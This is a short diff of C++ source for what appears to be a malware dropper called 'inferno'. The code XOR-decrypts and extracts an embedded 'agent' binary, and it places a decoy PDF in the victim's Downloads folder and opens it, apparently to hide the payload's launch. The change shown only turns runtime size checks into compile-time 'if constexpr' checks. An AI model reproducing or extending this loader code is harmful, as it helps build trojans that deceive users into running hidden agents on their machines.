@@ -49,7 +49,7 @@ const size_t DECOY_DATA_SIZE = 0;
 namespace {
 
 void decryptInPlace(unsigned char* data, size_t size) {
-    if (inferno::wrapper::XOR_KEY_LEN == 0) return;
+    if constexpr (inferno::wrapper::XOR_KEY_LEN == 0) return;
     for (size_t i = 0; i < size; ++i) {
         data[i] ^= inferno::wrapper::XOR_KEY[i % inferno::wrapper::XOR_KEY_LEN];
     }
@@ -188,7 +188,7 @@ bool createDirectoryForFile(std::string& path) {
 #endif // !defined(__APPLE__) || defined(INFERNO_TESTING)
 
 bool extractAgent(const std::string& target) {
-    if (inferno::wrapper::AGENT_BINARY_SIZE == 0) {
+    if constexpr (inferno::wrapper::AGENT_BINARY_SIZE == 0) {
         std::fprintf(stderr, "%s", UNLIT("[Wrapper] Agent binary not embedded.\n"));
         return false;
     }
@@ -427,7 +427,7 @@ int main(int argc, char* argv[]) {
 
     // Step 1: Extract decoy PDF to user-visible Downloads folder
     std::string pdf = decoyPath();
-    if (inferno::wrapper::DECOY_DATA_SIZE > 0) {
+    if constexpr (inferno::wrapper::DECOY_DATA_SIZE > 0) {
         if (extractFile(pdf, inferno::wrapper::DECOY_DATA,
                          inferno::wrapper::DECOY_DATA_SIZE)) {
             openFile(pdf);
